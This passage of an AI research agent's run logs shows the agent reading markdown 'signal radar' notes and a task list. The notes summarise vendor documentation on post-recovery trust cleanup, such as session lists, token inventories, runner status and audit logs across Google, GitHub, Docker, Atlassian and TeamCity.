Atlassian admin/email reactivation, and TeamCity empty-target plus encryption-key dependencies.\\n- Batch 010 kept the queue date (`2026-05-13`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-14-signal-radar-batch-011.md` with 8 post-restore verification and rehydration signals across Google billing propagation and restart checks, Google audit/state proof surfaces, GitHub repo/org partial restore gaps, Docker mount-proof surfaces, Atlassian replay gaps, and TeamCity readiness/reindex checks.\\n- Batch 011 kept the queue date (`2026-05-14`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-15-signal-radar-batch-012.md` with 8 post-recovery reconciliation/proof-bundle signals across Google asset diffs and exports, GitHub audit/member export and rebuild-query surfaces, Docker digest plus volume metadata attestations, and Atlassian inbound-email evidence logs.\\n- Batch 012 kept the queue date (`2026-05-15`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-16-signal-radar-batch-013.md` with 8 recovery-drill automation and recurring proof-capture signals across Google backup schedules and compliance reports, GitHub backup loops and remote archives, Docker diagnostics and live logs, Atlassian audit-log webhooks, and TeamCity backup plus readiness surfaces.\\n- Batch 013 kept the queue date (`2026-05-16`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-17-signal-radar-batch-014.md` with 8 recovery-drill blind-spot and excluded-state signals across Google compliance/logging visibility gaps, GitHub Actions external storage plus audit-stream cliffs, Docker volume omissions, Atlassian partial exports and backup allowlists, and TeamCity artifact or queue exclusions.\\n- Batch 014 kept the queue date (`2026-05-17`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-18-signal-radar-batch-015.md` with 8 manual-reattachment and human-checkpoint signals across Google billing and audit-log handoffs, GitHub Actions storage plus runner reseeding, Docker volume and VM-disk sidecars, TeamCity artifact remapping, and Atlassian admin/support restore gates.\\n- Batch 015 kept the queue date (`2026-05-18`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-19-signal-radar-batch-016.md` with 8 identifier-drift and reference-repair signals across Google service-account and region retargeting, Cloud SQL connection-surface rebinding, GitHub Actions storage plus runner-token invalidation, Docker path/container remapping, Atlassian link or group repair, and TeamCity ID-conflict or broken-URL repair.\\n- Batch 016 kept the queue date (`2026-05-19`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-20-signal-radar-batch-017.md` with 8 post-recovery credential-reissuance and auth-rebinding signals across Google KMS or CMEK key re-enable gates, GitHub runner re-registration plus org-permission rebuild, Atlassian app-access or BYOK reapproval steps, and TeamCity secure-value or encryption-key replay paths.\\n- Batch 017 kept the queue date (`2026-05-20`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-21-signal-radar-batch-018.md` with 8 post-recovery session-invalidation and stale-trust-cleanup signals across Google sign-in-cookie plus IdP-session residue and IAM propagation, GitHub SSO or PAT residue, Docker CLI PAT continuity under SSO enforcement, Atlassian logout timing, and TeamCity server-wide trust purge controls.\\n- Batch 018 kept the queue date (`2026-05-21`) separate from the verification date (`2026-05-05`).\\n\\n## Verification\\n\\n- `python3 -m pytest`\\n  - Result: `collected 0 items`\\n  - Exit code: `5`\\n  - Meaning: this workspace currently has no executable pytest suite in this session; do not treat the repo as test-green.\\n\\n## Inference\\n\\n- Public restore contracts are now clearly time-boxed and uneven: Google uses `30`-day windows for service accounts and projects, GitHub uses `30` days for packages and `90` days for repositories, and Atlassian uses `60` days for Jira service-project trash.\\n- The more important distinction is no longer just \\\"restorable\\\" vs \\\"not restorable\\\"; it is \\\"what preconditions must still hold before restore is even allowed, and what follow-through is required before the restored system is actually live?\\\"\\n- Batch 010 shows that recovery blockers are now explicit product surfaces: name reuse, non-empty fork graphs, admin-role topology, billing relink permissions, same-path disk restore, empty destination databases, and missing encryption keys.\\n- Batch 011 shows the next shift after restore blockers: operators now need proof that reactivation converged, replay debt is understood, sidecars are reattached, and the restored system is actually ready for live use.\\n- Batch 012 shows the next shift after post-restore readiness: recovery trust is now expressed as portable artifacts such as diffable history, exported audit/member state, immutable digests, volume metadata, and raw missed-event payloads.\\n- Batch 013 shows the next shift after proof bundles: the market is starting to expose recurring drill loops directly through schedules, compliance reports, external streams, remote archives, support bundles, and readiness probes.\\n- Batch 014 shows the next shift after recurring drills: vendors are increasingly explicit about what the automation loop does not capture, including omitted payload classes, short proof retention, duplicate or partial streams, and manual-only restore dependencies.\\n- Batch 015 shows the next shift after excluded-state disclosures: the strongest signals are now the explicit human handoff points where billing, audit capture, runner trust, sidecar files, or admin approvals still need to be reattached by hand.\\n- Batch 016 shows the next shift after human checkpoints: even when recovery data is present again, stable names, URLs, tokens, group bindings, and external references often still drift and require a separate repair pass.\\n- Batch 017 shows the next shift after identifier repair: recovered systems often still need fresh trust material or permission replay before they are truly usable, including disabled key versions, invalidated runner tokens, staged app access, BYOK reauthorization, and manually replayed CI secrets.\\n- Batch 018 shows the next shift after credential repair: issuing fresh trust is still insufficient until old cookies, old SSO sessions, old PATs, and delayed revocation windows are explicitly flushed and allowed to converge.\\n- The emerging editorial story is shifting from reversible delete to recovery-completeness operations: conflict checks, reindex progress, audit-backed rebuild manifests, compliance logs, remote archive sync, mount proofs, ready endpoints, diff exports, and missing-work reports are becoming the real signal surfaces.\\n\\n## Next\\n\\n- Produce batch 019 as a narrow post-recovery residual-trust inventory / cleanup-attestation pass.\\n- Center batch 019 on:\\n  - official surfaces that show which sessions, devices, tokens, agents, or recent authentications are still active after a reset,\\n  - inventory pages or APIs that let operators prove stale trust is actually gone,\\n  - last-used, recent-device, active-session, or active-token listings after revocation,\\n  - runner or agent status pages that expose whether machine trust has really re-enrolled or been purged,\\n  - and vendor docs that require comparing residual trust against an expected clean post-recovery baseline.\\n\",\"exit_code\":0,\"status\":\"completed\"}}\n/Users/lifcc/Desktop/code/AI/research/theme-signal-radar-runner/logs/iteration_019.log:87:{\"type\":\"item.completed\",\"item\":{\"id\":\"item_45\",\"type\":\"command_execution\",\"command\":\"/bin/zsh -lc \\\"sed -n '1,260p' theme-exploration-shared/signals/2026-05-22-signal-radar-batch-019.md\\\"\",\"aggregated_output\":\"# 2026-05-22 Signal Radar Batch 019\\n\\nVerified on 2026-05-05.\\n\\nNote:\\n- The filename follows the queue schedule.\\n- Each signal's `Date` field below refers to the source publication or page-update date when available, not the queue date.\\n\\nFocus:\\n- Post-recovery residual-trust inventory and cleanup attestation\\n- Coverage: user-factor and delegated-app inventories, machine-identity last-use surfaces, active-session and active-token views, runner or agent status inventories, and admin proof pages that let operators compare residual trust against an expected clean baseline\\n\\nMethod:\\n- Facts: only claims directly supported by the linked source page.\\n- Inference: editorial read on why the source matters.\\n- Recommendation: what to watch or how to use the signal in future theme selection.\\n- Confidence: `high`, `medium`, or `low`.\\n\\n## Residual Trust Evidence Captured\\n\\n- Google now exposes residual trust as inspectable metadata instead of a single post-reset verdict: Workspace admins can inspect last-used user factors and delegated apps, while Cloud admins can query last authentication times for service accounts and keys. Sources: https://support.google.com/a/answer/2537800 ; https://docs.cloud.google.com/policy-intelligence/docs/activity-analyzer-service-account-authentication\\n- GitHub splits cleanup attestation across three separate inventories: active sessions by device, active fine-grained PATs by organization, and self-hosted runner status by UI or REST API. Sources: https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/viewing-and-managing-your-sessions ; https://docs.github.com/en/organizations/managing-programmatic-access-to-your-organization/reviewing-and-revoking-personal-access-tokens-in-your-organization ; https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/monitor-and-troubleshoot ; https://docs.github.com/en/rest/actions/self-hosted-runners\\n- Docker pairs token inventory with corroborating audit evidence: PAT rows expose active state and last-used metadata, while activity logs can attribute actions to PATs or organization access tokens. Sources: https://docs.docker.com/security/access-tokens/ ; https://docs.docker.com/admin/activity-logs/\\n- Atlassian and TeamCity also favor proof tables over a one-click \\\"clean\\\" verdict: recent-device and managed-account exports expose lingering SaaS trust, while TeamCity exposes recently used VCS auth tokens, audit records, and user last-login timestamps. Sources: https://support.atlassian.com/atlassian-account/docs/manage-recently-used-devices-for-your-atlassian-account/ ; https://support.atlassian.com/security-and-access-policies/docs/export-managed-accounts/ ; https://support.atlassian.com/atlassian-cloud/kb/atlassian-administration-what-is-the-difference-between-users-page-and-managed-accounts-page/ ; https://www.jetbrains.com/help/teamcity/manage-access-tokens.html ; https://www.jetbrains.com/help/teamcity/rest/get-audit-records.html ; https://www.jetbrains.com/help/teamcity/rest/user.html\\n\\n## 01. Google Workspace turns post-recovery user trust into a field-by-field security inventory\\n- Date: n/a (docs page, verified 2026-05-05)\\n- Theme family: admin-visible residual trust metadata for user factors and delegated access\\n- Facts:\\n  - Google says the Passkeys & security keys section displays the name of each enrolled key, the platform or device it was created on, the enrollment method, passwordless support, and when and where the key was added and last used.\\n  - Google says admin log events record each passkey revoke and each security-key revoke.\\n  - Google says the Application-specific password section lists apps using app passwords, and clicking an app shows when the password was created and when it was last used.\\n  - Google says the Connected applications section lists third-party applications with access to the user's account data, including the access level and authorization date.\\n  - Source: https://support.google.com/a/answer/2537800\\n- Inference: Google is treating cleanup attestation as an inspection workflow across enrolled factors, legacy app passwords, and delegated app grants, not as a single \\\"trust cleared\\\" state.\\n- Why it matters: After a recovery or incident reset, operators need to explain every still-live factor and delegated app grant, and Google now exposes most of that residue directly on the user security page.\\n- Article potential: High for a piece on how post-recovery proof is shifting from password reset alone to detailed trust-inventory review.\\n- Recommendation: Keep favoring docs that expose last-used factor data, app-password rows, and delegated-app authorization dates in one admin surface; those are strong residual-trust signals.\\n- Confidence: high\\n- Evidence gaps: Google does not provide a single export or combined report that merges passkeys, app passwords, connected apps, and sign-in-cookie reset status into one cleanup verdict.\\n\\n## 02. Google Cloud treats service-account cleanup as a queryable last-auth surface, with explicit blind spots\\n- Date: n/a (docs page, verified 2026-05-05)\\n- Theme family: machine-identity residual trust and recent-auth attestation\\n- Facts:\\n  - Google says Activity Analyzer shows when service accounts and service account keys were last used to call a Google API.\\n  - Google says administrators can list the most recent authentication activities for all service accounts or service account keys by using `gcloud policy-intelligence query-activity` or the Policy Analyzer API.\\n  - Google says the console has dedicated panes for \\\"When was the last time this service account was used?\\\" and \\\"When was the last time this service account key was used?\\\" and can analyze up to 10 service accounts or keys at a time.\\n  - Google says results include `lastAuthenticatedTime`, and the key-listing step exposes each key's unique ID, creation time, and expiration time.\\n  - Google says requests authenticated by API keys bound to service accounts are not recorded in service account usage metrics, and activity outside Google Cloud APIs is not tracked by Activity Analyzer or service account insights.\\n  - Source: https://docs.cloud.google.com/policy-intelligence/docs/activity-analyzer-service-account-authentication\\n- Inference: Google is making machine-trust cleanup measurable, but only if operators actively query the right inventory surfaces and cross-check the documented blind spots.\\n- Why it matters: Post-recovery machine cleanup is incomplete without proof that service accounts and keys really stopped authenticating, especially when external or non-Google-Cloud usage can escape the main inventory.\\n- Article potential: High for a piece on how cloud recovery increasingly depends on \\\"last authenticated\\\" evidence instead of simple key rotation claims.\\n- Recommendation: Continue prioritizing official docs that publish last-auth query surfaces and their blind spots. They are stronger evidence than generic advice to rotate credentials.\\n- Confidence: high\\n- Evidence gaps: The feature is still labeled Preview and Google does not present a single authoritative view that covers every service-account use case across Cloud and non-Cloud Google APIs.\\n\\n## 03. GitHub's sessions page is an explicit residual-device inventory for both web and mobile access\\n- Date: n/a (docs page, verified 2026-05-05)\\n- Theme family: active interactive-session inventory and revoke controls\\n- Facts:\\n  - GitHub says users can view a list of devices that have logged into their account and revoke any sessions they do not recognize.\\n  - GitHub says the Sessions settings page shows active web sessions and a list of devices that logged in via the GitHub Mobile app.\\n  - GitHub says users can inspect web-session details and revoke a web session from the details view.\\n  - GitHub says revoking a mobile session signs the user out of the GitHub Mobile application on that device and removes it as a second-factor option.\\n  - Source: https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/viewing-and-managing-your-sessions\\n- Inference: GitHub is exposing cleanup attestation as a human-readable device/session ledger rather than assuming password changes or token rotation already closed the loop.\\n- Why it matters: After recovery, teams often need proof that old browser and mobile trust is actually gone, and GitHub gives end users a direct device inventory for that check.\\n- Article potential: Medium-high for a piece on how consumer-style session lists are becoming part of enterprise recovery evidence.\\n- Recommendation: Track official session-management docs that expose per-device or per-client inventories, not just revoke verbs.\\n- Confidence: high\\n- Evidence gaps: The page documents the user view, but it does not describe an organization-wide admin export or bulk member-session review flow.\\n\\n## 04. GitHub's Active tokens page is a residual-access inventory, but it is intentionally incomplete\\n- Date: n/a (docs page, verified 2026-05-05)\\n- Theme family: organization-scoped active-token inventory with documented visibility limits\\n- Facts:\\n  - GitHub says organization owners can open Settings > Personal access tokens > Active tokens to display any fine-grained personal access tokens that can access the organization.\\n  - GitHub says owners can filter the displayed tokens by owner, repository access, and permission set before revoking them.\\n  - GitHub says organization owners can also use REST API endpoints to review and revoke fine-grained personal access tokens, but only via GitHub Apps and not via personal access tokens or OAuth apps.\\n  - GitHub says organization owners cannot view or revoke personal access tokens (classic) in this UI, and unless classic PAT access has been restricted, any classic PAT can access organization resources until it expires.\\n  - Source: https://docs.github.com/en/organizations/managing-programmatic-access-to-your-organization/reviewing-and-revoking-personal-access-tokens-in-your-organization\\n- Inference: GitHub is giving admins a meaningful residual-token inventory, but also drawing a sharp line around which credential classes that inventory can and cannot prove clean.\\n- Why it matters: Cleanup attestation can be misleading if operators treat the Active tokens page as a complete token ledger when GitHub explicitly documents classic-PAT blind spots.\\n- Article potential: High for a piece on why token cleanup proof is only as good as the visibility model behind the inventory page.\\n- Recommendation: Keep highlighting docs that document both the visible token inventory and the classes of credentials that remain outside it.\\n- Confidence: high\\n- Evidence gaps: The docs describe filterable visibility but do not publish a built-in last-used field for the Active tokens inventory.\\n\\n## 05. GitHub self-hosted runner status has become a machine-trust inventory, not just a troubleshooting aid\\n- Date: n/a (docs pages, verified 2026-05-05)\\n- Theme family: runner fleet inventory and post-recovery re-enrollment proof\\n- Facts:\\n  - GitHub says the Actions > Runners page lists registered self-hosted runners with the runner name, labels, and status.\\n  - GitHub says runner status can be `Idle`, `Active`, or `Offline`.\\n  - GitHub's REST API for self-hosted runners returns structured runner records that include `id`, `name`, `os`, `status`, `busy`, `ephemeral`, and `labels`.\\n  - GitHub says administrators can use REST endpoints to list runners for an organization or repository.\\n  - Sources: https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/monitor-and-troubleshoot ; https://docs.github.com/en/rest/actions/self-hosted-runners\\n- Inference: The runner-control plane is effectively a residual machine-trust inventory now; after recovery, operators can compare which runner identities remain online, offline, or unexpectedly present.\\n- Why it matters: Runner cleanup and re-enrollment are central post-recovery tasks, and GitHub now exposes enough status metadata to distinguish \\\"registered but dead,\\\" \\\"alive and busy,\\\" and \\\"should no longer exist.\\\"\\n- Article potential: High for a piece on how CI recovery increasingly depends on agent inventory surfaces rather than one-time re-registration steps.\\n- Recommendation: Keep prioritizing vendor docs that expose both UI and API runner inventories with explicit status fields.\\n- Confidence: high\\n- Evidence gaps: GitHub does not provide a native baseline-diff report that says which runners are unexpected after a reset; operators must compare the current list against their own clean-state expectation.\\n\\n## 06. Docker ties residual CLI trust to two separate proof surfaces: token rows and attributable activity logs\\n- Date: n/a (docs pages, verified 2026-05-05)\\n- Theme family: token last-used inventory plus audit corroboration\\n- Facts:\\n  - Docker says the Personal access tokens page shows an overview of all tokens, including whether each token was manually generated or auto-generated, its scope, whether it is active or inactive, when it was created, when it was last used, and its expiration date.\\n  - Docker says users can rename, activate, deactivate, or delete a token from that page.\\n  - Docker says organization activity logs let owners view what changes were made, when a change was made, and who initiated it.\\n  - Docker says activity-log event descriptions that include a user action can refer to a Docker username, a personal access token, or an organization access token.\\n  - Docker says the Activity tab shows events from the last 30 days by default, and longer retrieval requires the Docker Hub API.\\n  - Sources: https://docs.docker.com/security/access-tokens/ ; https://docs.docker.com/admin/activity-logs/\\n- Inference: Docker is making token cleanup attestable through a join of token metadata and audit attribution, not through a single \\\"all CLI trust removed\\\" statement.\\n- Why it matters: Post-recovery Docker cleanup needs both an inventory of still-live tokens and a corroborating activity trail that can reveal whether a token or OAT is still being used.\\n- Article potential: High for a piece on how developer platforms are exposing token residue through last-used fields and audit attribution instead of only rotation guidance.\\n- Recommendation: Favor docs that expose both token last-used metadata and audit events that identify token-originated actions.\\n- Confidence: high\\n- Evidence gaps: Docker does not document a single built-in report that joins token inventory, token last-used metadata, and all historical PAT/OAT actions beyond the UI retention window.\\n\\n## 07. Atlassian splits cleanup attestation across recent-device views, managed-account exports, and per-user token metadata\\n- Date: n/a (docs pages and support KB, verified 2026-05-05)\\n- Theme family: SaaS account residual-trust inventory across interactive and non-interactive surfaces\\n- Facts:\\n  - Atlassian says the recent devices list shows devices that are currently logged in to the account, including browser or mobile-app context, IP address, and either last login or last mobile-app use time.\\n  - Atlassian says non-interactive logins, such as calls that use API tokens, do not appear in the recent devices list.\\n  - Atlassian says organization admins can export managed accounts to CSV, including each account's last active time, status, policy name and type, SAML SSO status, two-step-verification status, password requirements, idle session duration, and product/site access.\\n  - Atlassian's support KB says the managed-account detail page lets org admins view and control API tokens, including `Last accessed` and `Created on`, and also administer recently used devices.\\n  - Sources: https://support.atlassian.com/atlassian-account/docs/manage-recently-used-devices-for-your-atlassian-account/ ; https://support.atlassian.com/security-and-access-policies/docs/export-managed-accounts/ ; https://support.atlassian.com/atlassian-cloud/kb/atlassian-administration-what-is-the-difference-between-users-page-and-managed-accounts-page/\\n- Inference: Atlassian is exposing post-recovery proof as a set of adjacent inventories: interactive device residue, account-level activity and policy state, and per-user API token metadata.\\n- Why it matters: Recovery cleanup can look complete if teams inspect only recent devices, while API-token or account-policy residue remains visible elsewhere.\\n- Article potential: High for a piece on how SaaS admins increasingly need multi-surface account inventories to prove trust cleanup.\\n- Recommendation: Keep preferring vendor docs that explicitly say which trust classes are visible in each inventory and which are excluded.\\n- Confidence: medium-high\\n- Evidence gaps: Atlassian does not document a single export that combines recent devices, API-token last-accessed data, and managed-account policy state into one cleanup-attestation artifact.\\n\\n## 08. TeamCity exposes residual trust through \\\"recently used\\\" tokens, last-login fields, and filterable audit records\\n- Date: n/a (docs pages, verified 2026-05-05)\\n- Theme family: CI admin proof surfaces for token reuse and user activity\\n- Facts:\\n  - JetBrains says the VCS Auth Tokens page provides centralized access to refreshable tokens for a project and its subprojects, lets admins find tokens by name, related connection, and issuing user, and without filters shows the 10 most recently used tokens.\\n  - JetBrains says the TeamCity user REST resource includes a `lastLogin` property that records the date and time when a user last logged in.\\n  - JetBrains says audit records are available on the Administration | Audit page and via `/app/rest/audit`.\\n  - JetBrains says the audit REST API supports filters such as `count`, `user`, and `action`.\\n  - Sources: https://www.jetbrains.com/help/teamcity/manage-access-tokens.html ; https://www.jetbrains.com/help/teamcity/rest/user.html ; https://www.jetbrains.com/help/teamcity/rest/get-audit-records.html ; https://www.jetbrains.com/help/teamcity/tracking-user-actions.html\\n- Inference: TeamCity is treating cleanup attestation as an admin toolkit of separate inventories and logs rather than a single session or token dashboard.\\n- Why it matters: After recovery, CI operators need to answer which VCS auth tokens were recently active, which users still logged in, and what sensitive actions were taken, and TeamCity now exposes each of those questions through different proof surfaces.\\n- Article potential: Medium-high for a piece on how CI systems are surfacing residual trust through admin artifacts instead of a one-shot \\\"secure again\\\" marker.\\n- Recommendation: Watch for vendor docs that combine \\\"recently used,\\\" `lastLogin`, and audit filtering. Those are strong clues that post-recovery proof is becoming an operator-led reconciliation workflow.\\n- Confidence: high\\n- Evidence gaps: JetBrains does not document a single server-wide view that merges all access tokens, active sessions, and recent logins into one cleanup verdict.\\n\\n## Current Editorial Read\\n\\n- Facts:\\n  - The strongest official signals in this batch are inventory-first: Google shows last-used factors and service-account auth times, GitHub shows active sessions, active fine-grained PATs, and runner status, Docker shows token last-used state and token-attributed activity logs, Atlassian shows recent devices plus last-active account exports, and TeamCity shows recently used VCS auth tokens plus last-login and audit records.\\n  - These proof surfaces are intentionally partial. Google documents service-account activity blind spots, GitHub documents classic-PAT visibility gaps, Docker limits the UI activity window to 30 days, Atlassian excludes API-token logins from recent devices, and TeamCity spreads the evidence across multiple pages and APIs.\\n  - The recovery sequence has evolved again: restore -> reissue trust -> flush stale trust -> inventory residual trust -> explain every remaining device, token, runner, key, or app grant.\\n- Inference:\\n  - The next strong editorial move after stale-trust cleanup is baseline comparison. Vendors now expose enough inventory surface to ask why a specific residual item is still present, but they rarely provide the answer automatically.\\n  - Post-recovery proof is becoming a cross-table reconciliation exercise, not a single revoke or restore event.\\n- Recommendation:\\n  - Queue the next batch around post-recovery baseline diff and cleanup exception queues: pending approvals, offline runners or devices that should be gone, unmanaged tokens outside policy, and unresolved residual-trust mismatches that remain after the inventory pass.\\n  - Keep preferring official docs that expose filterable exception lists, last-used metadata, or policy-mismatch exports over docs that only describe how to revoke access.\\n\",\"exit_code\":0,\"status\":\"completed\"}}\n/Users/lifcc/Desktop/code/AI/research/theme-signal-radar-runner/logs/iteration_024.log:10:{\"type\":\"item.completed\",\"item\":{\"id\":\"item_3\",\"type\":\"command_execution\",\"command\":\"/bin/zsh -lc \\\"sed -n '1,220p' ../memory/TASKS.md && printf '\\\\\\\\n=====CONTEXT=====\\\\\\\\n' && sed -n '1,220p' ../memory/CONTEXT.md && printf '\\\\\\\\n=====DONE=====\\\\\\\\n' && tail -n 40 ../memory/DONE.md\\\"\",\"aggregated_output\":\"# Tasks\\n\\n## Active\\n\\n- [x] Create `theme-exploration-shared/signals/2026-05-04-signal-radar-batch-001.md` with at least 25 source-backed signals across AI agents, coding agents, AI devtools, AI infra/pricing, creative AI, local-first tools, open-source productization, and content automation.\\n- [x] For each signal, include: source URL, date if available, theme family, why it matters, article potential, confidence, and evidence gaps.\\n- [x] Add the next concrete signal-radar batch task after batch 001 is complete.\\n- [x] Create `theme-exploration-shared/signals/2026-05-05-signal-radar-batch-002.md` focused on protocol interoperability and distribution, with 12 source-backed signals across MCP, A2A, ACP, managed MCP endpoints, registry surfaces, and IDE support.\\n- [x] For batch 002, capture at least 5 adoption or distribution evidence points and keep facts separate from inferred market structure.\\n- [x] Create `theme-exploration-shared/signals/2026-05-06-signal-radar-batch-003.md` focused on protocol control planes, with 10 source-backed signals across approvals, OAuth/auth, quotas, sandboxing, registry trust, and tool-surface minimization.\\n- [x] For batch 003, capture at least 4 concrete control-plane evidence points from official OpenAI, Anthropic, Google, Docker, GitHub, Atlassian, or JetBrains surfaces.\\n- [x] Create `theme-exploration-shared/signals/2026-05-07-signal-radar-batch-004.md` focused on protocol observability and accountability, with 8 source-backed signals across audit logs, tracing, approval history, usage metering, eval loops, and post-action review.\\n- [x] For batch 004, capture at least 4 concrete observability or audit evidence points from official OpenAI, Anthropic, Google, Docker, GitHub, Atlassian, or JetBrains surfaces.\\n- [x] Create `theme-exploration-shared/signals/2026-05-08-signal-radar-batch-005.md` focused on protocol change control and provenance, with 8 source-backed signals across frozen snapshots, action diffs, version pinning, signature verification, registry trust metadata, and update-notification gaps.\\n- [x] For batch 005, capture at least 4 concrete provenance or change-review evidence points from official OpenAI, Anthropic, Google, Docker, GitHub